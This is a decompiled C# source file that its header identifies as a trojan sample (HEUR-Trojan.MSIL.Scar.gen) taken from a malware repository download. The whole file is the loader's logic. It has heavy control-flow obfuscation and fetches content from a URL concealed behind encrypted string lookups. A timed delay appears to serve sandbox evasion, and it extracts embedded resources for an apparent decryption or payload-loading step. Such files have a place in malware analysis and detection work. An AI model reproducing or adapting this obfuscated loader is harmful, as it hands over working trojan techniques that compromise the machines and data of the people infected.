// Decompiled with JetBrains decompiler
// Type: Arrznfhcz.Shared.Callback
// Assembly: ConsoleApp13, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B655A79A-67BF-4D11-3C9F-30AAF7B05A65
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Scar.gen-9cde0d9eb4a1bd5801ecea6dca2b0883ce6136a99ec76c4e9dbcbbf06f186f49.exe

using Arrznfhcz.Objects;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Arrznfhcz.Shared
{
  internal sealed class Callback
  {
    private object _Visitor;
    private object _Facade;
    private string product = Publisher.ManageObserver(1501420160);
    internal static Callback CloneCollection;

    public Callback()
    {
      int num1 = 0;
      if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_566d922ed9d14ab0bbc0075157c0261c == 0)
        num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_19;
          default:
            this.PushObserver();
            try
            {
              this._Visitor = Callback.OrderObserver(Publisher.ManageObserver(1501420185));
              int num2 = 3;
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_dda405246662441da72f7128bc7af5e6 != 0)
                goto label_6;
label_5:
              int num3;
              num2 = num3;
label_6:
              HttpWebResponse response;
              Stream stream;
              bool flag;
              StreamReader streamReader;
              while (true)
              {
                switch (num2)
                {
                  case 1:
                    goto label_13;
                  case 2:
                    streamReader = (StreamReader) null;
                    flag = string.IsNullOrWhiteSpace(response.CharacterSet);
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_300d51abc2d74aaf9f7d70a870132ede != 0)
                    {
                      num2 = 6;
                      continue;
                    }
                    goto label_5;
                  case 3:
                    response = (HttpWebResponse) WebRequest.Create(this.product).GetResponse();
                    num2 = 8;
                    continue;
                  case 4:
                    Console.WriteLine(streamReader.ReadToEnd());
                    if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_30a1a84750d84e30a7cdd3e1e1aaa885 == 0)
                    {
                      num2 = 1;
                      continue;
                    }
                    goto label_5;
                  case 5:
                    streamReader = new StreamReader(stream, Encoding.GetEncoding((string) Callback.FindCollection((object) response)));
                    num2 = 4;
                    continue;
                  case 6:
                    if (flag)
                      goto case 7;
                    else
                      goto case 5;
                  case 7:
                    streamReader = new StreamReader(stream);
                    goto case 4;
                  case 8:
                    if (Callback.CallCollection((object) response) == HttpStatusCode.OK)
                    {
                      if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_94b43952bd2f4d6d8a61dbd2338be9d8 != 0)
                      {
                        num2 = 0;
                        continue;
                      }
                      goto label_5;
                    }
                    else
                      goto label_20;
                  default:
                    stream = (Stream) Callback.CheckCollection((object) response);
                    num2 = 2;
                    continue;
                }
              }
label_13:
              Callback.CalcCollection((object) response);
              streamReader.Close();
            }
            catch
            {
            }
label_20:
            Callback.ForgotCollection(Callback.VisitCollection((object) new Translate.Translate(), this._Visitor, this._Facade, Callback.CancelCollection(1501420214)));
            int num4;
            num1 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_0a579c2b8b9841b59bed117fa2de327a == 0 ? 1 : num4;
            continue;
        }
      }
label_19:;
    }

    private void PushObserver()
    {
      try
      {
        this._Facade = Callback.ComputeCollection(Callback.CancelCollection(1501420231));
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(this.product);
        int num1 = 2;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_38184a5208fb49a5a1a163cbefbf218b == 0)
          goto label_5;
label_3:
        while (true)
        {
          HttpWebResponse httpWebResponse;
          switch (num1)
          {
            case 1:
              goto label_8;
            case 2:
              httpWebResponse = (HttpWebResponse) Callback.DestroyCollection((object) httpWebRequest);
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_5e44441515b64910b83390b1e3b9c6cb == 0)
              {
                num1 = 0;
                continue;
              }
              break;
            default:
              StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
              Callback.ForgotCollection(Callback.RunCollection((object) streamReader));
              streamReader.Close();
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_63a7b40bc45a4904ac2ec31aeee5b3d1 != 0)
              {
                num1 = 1;
                continue;
              }
              break;
          }
          int num2;
          num1 = num2;
        }
label_8:
        return;
label_5:
        num1 = 1;
        goto label_3;
      }
      catch (Exception ex)
      {
      }
    }

    private static byte[] StartObserver(string init)
    {
      Assembly assembly = (Assembly) Callback.RestartCollection();
      string[] manifestResourceNames = assembly.GetManifestResourceNames();
      int num1 = 7;
      byte[] numArray;
      while (true)
      {
        int num2;
        int index;
        string name;
        MemoryStream destination;
        int num3;
        bool flag;
        Stream manifestResourceStream;
        switch (num1)
        {
          case 1:
          case 11:
            if (num3 > 10)
            {
              manifestResourceStream.CopyTo((Stream) destination);
              numArray = (byte[]) Callback.InterruptCollection((object) destination);
              num1 = 10;
              continue;
            }
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_8ccd580b8a6548a7bac0b022bb4fbebd != 0)
            {
              num1 = 0;
              continue;
            }
            break;
          case 2:
            if (!flag)
            {
              ++index;
              num1 = 8;
              continue;
            }
            manifestResourceStream = assembly.GetManifestResourceStream(name);
            num1 = 9;
            continue;
          case 3:
            goto label_7;
          case 4:
          case 8:
            if (index < manifestResourceNames.Length)
            {
              name = manifestResourceNames[index];
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_857fbc1eb13d453dba2985e6c5d95884 != 0)
              {
                num1 = 5;
                continue;
              }
              break;
            }
            num2 = 3;
            break;
          case 5:
            flag = name.Contains(init);
            num1 = 2;
            continue;
          case 6:
            num3 = 0;
            num1 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_5013aa710397498893ebe7b3154eb1a9 != 0 ? 0 : 1;
            continue;
          case 7:
            index = 0;
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_9ceb7288d8474df683163482e13e6d4d == 0)
            {
              num1 = 4;
              continue;
            }
            break;
          case 9:
            destination = new MemoryStream();
            num1 = 6;
            continue;
          case 10:
            goto label_12;
          default:
            Callback.AssetCollection(num3);
            num3 += 2;
            num1 = 11;
            continue;
        }
        num1 = num2;
      }
label_7:
      return (byte[]) null;
label_12:
      return numArray;
    }

    private static object OrderObserver(string first)
    {
      int num1 = 4;
label_1:
      int num2 = num1;
      Stopwatch stopwatch;
      bool flag;
      TimeSpan timeSpan;
      while (true)
      {
        switch (num2)
        {
          case 1:
            if (flag)
            {
              Thread.Sleep(10);
              num2 = 2;
              continue;
            }
            goto label_5;
          case 3:
            stopwatch.Start();
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_88f06c97e7454922b8d0bab1b36aede1 != 0)
            {
              num2 = 0;
              continue;
            }
            goto label_1;
          case 4:
            stopwatch = new Stopwatch();
            num2 = 3;
            continue;
          case 5:
            flag = timeSpan.Seconds < 8;
            num2 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_8dc5aa4a1743454eaf4a55674886639c == 0 ? 1 : 1;
            continue;
          default:
            timeSpan = Callback.DisableCollection((object) stopwatch);
            num2 = 5;
            continue;
        }
      }
label_5:
      stopwatch.Stop();
      return (object) Callback.StartObserver(first);
    }

    internal static HttpStatusCode CallCollection([In] object obj0) => ((HttpWebResponse) obj0).StatusCode;

    internal static object CheckCollection([In] object obj0) => (object) ((WebResponse) obj0).GetResponseStream();

    internal static object FindCollection([In] object obj0) => (object) ((HttpWebResponse) obj0).CharacterSet;

    internal static void CalcCollection([In] object obj0) => ((WebResponse) obj0).Close();

    internal static object CancelCollection(int res_ID) => (object) Publisher.ManageObserver(res_ID);

    internal static object VisitCollection([In] object obj0, [In] object obj1, [In] object obj2, [In] object obj3) => (object) ((Translate.Translate) obj0).WriteLine(obj1, obj2, obj3);

    internal static void ForgotCollection([In] object obj0) => Console.WriteLine((string) obj0);

    internal static bool ReadCollection() => Callback.CloneCollection == null;

    internal static Callback EnableCollection() => Callback.CloneCollection;

    internal static object ComputeCollection([In] object obj0) => Callback.OrderObserver((string) obj0);

    internal static object DestroyCollection([In] object obj0) => (object) ((WebRequest) obj0).GetResponse();

    internal static object RunCollection([In] object obj0) => (object) ((TextReader) obj0).ReadLine();

    internal static object RestartCollection() => (object) Assembly.GetExecutingAssembly();

    internal static void AssetCollection([In] int obj0) => Console.WriteLine(obj0);

    internal static object InterruptCollection([In] object obj0) => (object) ((MemoryStream) obj0).ToArray();

    internal static TimeSpan DisableCollection([In] object obj0) => ((Stopwatch) obj0).Elapsed;
  }
}
